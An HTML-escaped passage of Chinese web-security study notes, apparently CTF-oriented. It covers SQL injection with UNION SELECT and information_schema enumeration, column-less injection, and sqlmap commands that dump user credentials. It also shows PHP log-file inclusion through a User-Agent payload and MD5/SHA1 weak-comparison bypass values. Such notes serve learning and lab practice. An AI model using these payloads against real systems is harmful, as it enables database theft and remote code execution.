&lt;p&gt;添加 &amp;quot;&lt;strong&gt;+&lt;/strong&gt;&amp;quot; 确保注释 -- 后⾯有⼀个空格，这样数据库就能正确解析这个 SQL 注释。&lt;/p&gt;
&lt;h2 id=&#34;sql注入中的union-select&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sql注入中的union-select&#34;&gt;#&lt;/a&gt; sql 注入中的 union select&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/qq_44159028/article/details/114820256&#34;&gt;https://blog.csdn.net/qq_44159028/article/details/114820256&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;UNION&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-mysql&#34;&gt;SELECT 列名 FROM 表名
UNION
SELECT 列名_1 FROM 表名_1;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;注意使用 &lt;code&gt;UNION&lt;/code&gt;  的时候要注意两个表的数量必须相同&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;union-select&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#union-select&#34;&gt;#&lt;/a&gt; union select&lt;/h4&gt;
&lt;p&gt;用来合并两个或多个 SELECT 语句的结果集&lt;/p&gt;
&lt;p&gt;union select &lt;em&gt;只能查询两个表中共同都有的字段&lt;/em&gt;，如果一个字段在另外一个表中没有，就会报错&lt;/p&gt;
&lt;h4 id=&#34;select-123&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#select-123&#34;&gt;#&lt;/a&gt; select 1,2,3...&lt;/h4&gt;
&lt;p&gt;select 直接加数字串时，&lt;strong&gt;可以不写后面的表名&lt;/strong&gt;，那么它输出的内容就是我们 select 后的数字，这时我们写的一串数字就是一个数组（或 1 个行向量），这时 select&lt;strong&gt; 实际上没有向任何一个数据库查询数据，即查询命令不指向任何数据库的表。返回值就是我们输入的这个数组，这时它是个 1 行 n 列的表，表的属性名和值都是我们输入的数组&lt;/strong&gt;，.select 之后可以接一串数字：1,2,3… 只是一个例子，这串数字并不一定要按从小到大排列，不一定从 1 开始，这串数字的值和顺序是任意的，甚至可以是重复的，如：11,465,7461，35 或 11,11,11,11，数字串的长度也是任意的，我们想获得多少列的数据，就写多少个数字&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://img-blog.csdnimg.cn/20210315102825231.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
&lt;h4 id=&#34;select-加数字串并加上数据库表的名字&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#select-加数字串并加上数据库表的名字&#34;&gt;#&lt;/a&gt; select 加数字串并加上数据库表的名字&lt;/h4&gt;
&lt;p&gt;users2 如下&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://img-blog.csdnimg.cn/20210315101627932.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
&lt;p&gt;进行查询，select 1,22,34,45,65 from users2&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://img-blog.csdnimg.cn/20210315102507930.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
&lt;p&gt;users2 表有四个字段，可以看出行行代表 表格的字段（id,name,age,address）。原来的 id，name 等属性被替换成了这些数字串，而且我们输入的数字串长度是任意的，输入几个数字，就会出现几个属性，也就是说返回表的列数是等于我们输入的数字个数的，而行数与原数据库表的结构保持一致，原本有 4 行数据，输入数字串后仍为 4 行。&lt;/p&gt;
&lt;h4 id=&#34;简单的sql注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简单的sql注入&#34;&gt;#&lt;/a&gt; 简单的 sql 注入&lt;/h4&gt;
&lt;p&gt;-1‘ union select 1,2,3#&lt;/p&gt;
&lt;h2 id=&#34;获取所有表结构tables&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#获取所有表结构tables&#34;&gt;#&lt;/a&gt; 获取所有表结构 (TABLES)&lt;/h2&gt;
&lt;p&gt;SELECT  *  FROM information_schema.TABLES WHERE  TABLE_SCHEMA=&#39; 数据库名 &#39;;&lt;/p&gt;
&lt;h2 id=&#34;limit&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#limit&#34;&gt;#&lt;/a&gt; LIMIT&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;#返回表中前 number 行数据&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;SELECT column1, column2, ... FROM table_name LIMIT number;  #从 offset+1 行开始返回 row_count 行数据&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;#从 offset+1 行开始返回 row_count 行数据&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;SELECT column1, column2, ... FROM table_name LIMIT offset, row_count;&lt;br /&gt;
# 比如 LIMIT 10, 10 返回 11-20 行数据&lt;/p&gt;
&lt;h2 id=&#34;sql注入通过是否报错信息判断注入类型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sql注入通过是否报错信息判断注入类型&#34;&gt;#&lt;/a&gt; SQL 注入通过是否报错信息判断注入类型&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;输入&lt;/th&gt;
&lt;th&gt;后台执行&lt;/th&gt;
&lt;th&gt;后台报错&lt;/th&gt;
&lt;th&gt;解释&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;1&amp;quot;&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;id = &amp;quot;1&amp;quot;&amp;quot;&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;near &#39;&amp;quot;1&amp;quot;&amp;quot;&#39; at line 1&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;去掉外层 SQL 的单引号，留下 &lt;code&gt;&amp;quot;1&amp;quot;&amp;quot;&lt;/code&gt; ，除去自己的输入  &lt;code&gt;1&amp;quot;&lt;/code&gt;  可知类型为 &lt;strong&gt;双引号&lt;/strong&gt; 的 &lt;strong&gt;字符型注入&lt;/strong&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;1&#39;&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;id = &#39;1&#39;&#39;&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;near &#39;&#39;1&#39;&#39;&#39; at line 1&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;同理，留下 &lt;code&gt;&#39;1&#39;&#39;&lt;/code&gt;  除去自己的输入  &lt;code&gt;1&#39;&lt;/code&gt;  可知类型为 &lt;strong&gt;单引号&lt;/strong&gt; 的 &lt;strong&gt;字符型注入&lt;/strong&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;&#39;1&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;id = &#39;&#39;1&#39;&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;near &#39;1&#39;&#39; at line 1&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;对于后台 SQL，由于  &lt;code&gt;id = &#39;&#39;&lt;/code&gt;  已经合法闭合，所以后面  &lt;code&gt;1&#39;&lt;/code&gt;  反而为多出的语句，所以报错点在  &lt;code&gt;1&#39;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;第一个当内容为 &#39;&amp;quot;1&amp;quot;&amp;quot;&#39; 时，先去掉两边单引号得到 &amp;quot;1&amp;quot;&#39;&#39;，可知出错内容为 &amp;quot;1&#39;&#39;&amp;quot;&lt;/p&gt;
&lt;p&gt;第三个报错内容为 &#39;1&#39;&#39; 时候，说明出错内容为 1&#39;, 前面已经闭合，因此报错内容在 1&#39; 由此可以推断为单引号型注入&lt;/p&gt;
&lt;h2 id=&#34;sql注入常见流程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sql注入常见流程&#34;&gt;#&lt;/a&gt; SQL 注入常见流程&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-mysql&#34;&gt;id = 1 Order by 1;
id = 1 Order by 2;
id = 1 Order by 3; # 报错 确定列数为 2 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;使用联合查询  &lt;code&gt;union&lt;/code&gt;  基于  &lt;code&gt;information_schema&lt;/code&gt;  拿到数据库名&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-mysql&#34;&gt;union SELECT 1,schema_name FROM information_schema.schemata;
# or
1 union SELECT schema_name,2 FROM information_schema.schemata;
# 注意这里的 schema_name 一定要放在会显示的列名上面 比如password不显示 但是username显示 那么就用第二种。
# 此时后台执行为:
SELECT username,password FROM users WHERE id = 1 union SELECT 1,schema_name FROM information_schema.schemata;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;判断那个是否显示只需要尝试注入几次就可以了&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;用联合查询得到数据库里面的表名&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-mysql&#34;&gt; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()
1 union select group_concat(table_name),2 from information_schema.tables where table_schema=database()
# 原理同上
# 如果要查询其他数据库 可以写为 where table_schema=&#39;databaseNAME&#39;
# 后台执行为：
SELECT username,password FROM users WHERE id = 1 union select group_concat(table_name),2 from information_schema.tables where table_schema=database()
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;sql注入知识&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sql注入知识&#34;&gt;#&lt;/a&gt; SQL 注入知识&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;information_schema.schemata: 记录所有数据库名的表&lt;/strong&gt; 在 schemata 表中，schema_name 字段用来存储数据库名&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;information_schema.tables：记录所有表名信息的表&lt;/strong&gt;在 table 表中，table_schema 和 table_name 分别用来存储数据库名和表名&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;information_schema.columns：记录所有列名信息的表&lt;/strong&gt; table_schema（数据库名），table_name（表名），column_name（字段名）&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;table_name：表名&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;column_name：列名&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;table_schema：数据库名&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;database_name: mysql.innodb_table_stats 中的数据库名&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;跨库选择表：需要在表前添加该表的数据库名称，否则会默认为当前库的表。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ex: select * from 数据库名.表名&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;sql无列名注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sql无列名注入&#34;&gt;#&lt;/a&gt; SQL 无列名注入&lt;/h2&gt;
&lt;p&gt;当 information_schema 被滤过时，可以利用表 mysql.innodb_table_stats &lt;code&gt;、&lt;/code&gt; mysql.innodb_table_index, 同样具有库名表名，但不具有列名。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://i-blog.csdnimg.cn/blog_migrate/35f511a354574d99b8eab869009c6cdf.png&#34; alt=&#34;在这里插入图片描述&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;无列名查询:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;无列名注入，因为不知道列名，所以将列名用 select  1,2,3... union select * from 数据表的方式将列名更换为 1,2,3..&lt;/p&gt;
&lt;p&gt;如:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;id=0&#39;union select 1,2,group_concat(&#39;1&#39;) from (select 1 union select *from ctftraining.flag)a where 1=&#39;1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;*&lt;em&gt; 这里 (select 1 union select &lt;em&gt;from ctftraining.flag) a 相当于是将通过 select union select 操作更换过列名的表命名为 a, 从使得前面的 union select 可以用数字 &#39;1&#39; 来查列名下的内容，&lt;/em&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;当 &#39;&#39; 被禁用时，可以用 as 的方式，为列名命名另一个名称来进行无列名查询&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;id=0&#39;union select 1,2,group_concat(b) from (select 1 as b union select *from ctftraining.flag)a where 1=&#39;1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;列名获取:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;通过使用 join 和 using, 在使用 join 来拼接表时，有一个语法错误为两张表中的列名重复，因此可以显示该语法错误来找到该表的列名（如果两张表为同一张表需要给两张表以及拼接后的表都起一个别名）&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; tableName &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; a &lt;span class=&#34;token keyword&#34;&gt;join&lt;/span&gt; tableName &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; b&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; c&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; tableName &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; a &lt;span class=&#34;token keyword&#34;&gt;join&lt;/span&gt; tableName &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; b &lt;span class=&#34;token keyword&#34;&gt;using&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;colunmName&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; c&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;// 使用 using 避免重复列&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://i-blog.csdnimg.cn/blog_migrate/45d49a6b33516938ac0bf3685b0b7369.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://i-blog.csdnimg.cn/blog_migrate/a755f08753bf7e1dba65dba2c8607491.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;sqlmap&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sqlmap&#34;&gt;#&lt;/a&gt; SQLmap&lt;/h2&gt;
&lt;p&gt;vim sql.http 把 bp 抓到的请求写进去并:wq 保存&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sqlmap -r ./sql.http -p  id -dbs --batch&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sqlmap -r ./sql.http -p id --current-db --batch&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sqlmap -r ./sql.http -p id -D pikachu -tables --batch&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sqlmap -r ./sql.http -p id -D pikachu -T users --columns --batch&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sqlmap -r ./sql..http -p id -D pikachu -T users -C username,password -dump --batch&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;字符型:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sqlmap -u &#39;url&#39; -p name -bs --batch&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;http-请求头中的-remote_addr-x-forwarded-for-x-real-ip&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#http-请求头中的-remote_addr-x-forwarded-for-x-real-ip&#34;&gt;#&lt;/a&gt; HTTP 请求头中的 Remote_Addr, X-Forwarded-For, X-Real-IP&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Remote_Addr&lt;/strong&gt;&lt;br /&gt;
Remote_Addr 是一个标准 HTTP 请求头，用于标识发起请求的客户端的 IP 地址。这个头部字段通常由 Web 服务器用来记录或日志记录客户端的 IP 地址。然而，由于大多数 Web 请求都经过了代理服务器或负载均衡器，&lt;strong&gt;Remote_Addr 头部字段通常包含的是代理服务器的 IP 地址，而不是原始客户端的 IP 地址。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;X-Forwarded-For&lt;/strong&gt;&lt;br /&gt;
X-Forwarded-For 是一个常用的 HTTP 请求头，用于揭示请求在经过代理服务器时的来源 IP 地址。当一个请求经过一个或多个代理服务器时，每个代理服务器都会在 X-Forwarded-For 头部字段中添加其自己的 IP 地址。这样，最终的 Web 服务器可以从 X-Forwarded-For 头部字段中获取完整的客户端 IP 地址列表。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;X-Real-IP&lt;/strong&gt;&lt;br /&gt;
X-Real-IP 是另一个用于标识客户端真实 IP 地址的 HTTP 请求头。与 X-Forwarded-For 不同，X-Real-IP 是由最后一个代理服务器设置的，用于揭示未经任何代理服务器转发的原始客户端 IP 地址。&lt;/p&gt;
&lt;h2 id=&#34;日志文件包含&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#日志文件包含&#34;&gt;#&lt;/a&gt; 日志文件包含&lt;/h2&gt;
&lt;p&gt;一般位于:&lt;/p&gt;
&lt;p&gt;apache:/var/log/apache/access.log&lt;/p&gt;
&lt;p&gt;nginx:/var/log/nginx/access.log&lt;/p&gt;
&lt;p&gt;通过修改 User-Agent: 执行命令 如 &amp;lt;?php system (&#39;ls&#39;); ?&amp;gt;&lt;/p&gt;
&lt;h2 id=&#34;md5绕过-sha1绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#md5绕过-sha1绕过&#34;&gt;#&lt;/a&gt; md5 绕过 sha1 绕过&lt;/h2&gt;
&lt;h3 id=&#34;10e绕过弱比较&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#10e绕过弱比较&#34;&gt;#&lt;/a&gt; 1.0e 绕过弱比较&lt;/h3&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;name&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;password&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;MD5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;name&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;MD5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;password&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;flag&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;PHP 在处理哈希字符串时，它把每一个以 “0E” 开头的哈希值都解释为 0，所以如果两个不同的密码经过哈希以后，其哈希值都是以 “0E” 开头的，PHP 会当作科学计数法来处理，也就是 0 的 n 次方，得到的值比较的时候都相同。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;以下值在 md5 加密后以 0E 开头：&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;QNKCDZO&lt;/li&gt;
&lt;li&gt;240610708&lt;/li&gt;
&lt;li&gt;s878926199a&lt;/li&gt;
&lt;li&gt;s155964671a&lt;/li&gt;
&lt;li&gt;s214587387a&lt;/li&gt;
&lt;li&gt;s214587387a&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;以下值在 sha1 加密后以 0E 开头：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;aaroZmOk&lt;/li&gt;
&lt;li&gt;aaK1STfY&lt;/li&gt;
&lt;li&gt;aaO8zKZF&lt;/li&gt;
&lt;li&gt;aa3OFF9m&lt;/li&gt;
&lt;li&gt;0e1290633704&lt;/li&gt;
&lt;li&gt;10932435112&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;双重 MD5 加密后 0E 开头：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;7r4lGXCH2Ksu2JNT3BYM&lt;/li&gt;
&lt;li&gt;CbDLytmyGm2xQyaLNhWn&lt;/li&gt;
&lt;li&gt;770hQgrBOjrcqftrlaZk&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;数组绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数组绕过&#34;&gt;#&lt;/a&gt; &lt;strong&gt;数组绕过：&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;MD5 ()，sha1 () 函数无法处理数组，如果传入的为数组，会返回 NULL，所以两个数组经过加密后得到的都是 NULL，也就是相等的。&lt;/p&gt;
&lt;h3 id=&#34;md5碰撞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#md5碰撞&#34;&gt;#&lt;/a&gt; md5 碰撞&lt;/h3&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;show_source&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token constant&#34;&gt;__FILE__&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword type-casting&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;a&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;!==&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword type-casting&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;b&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token function&#34;&gt;md5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;a&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;===&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;md5&lt;/span&gt;&lt;span class=&#34;token 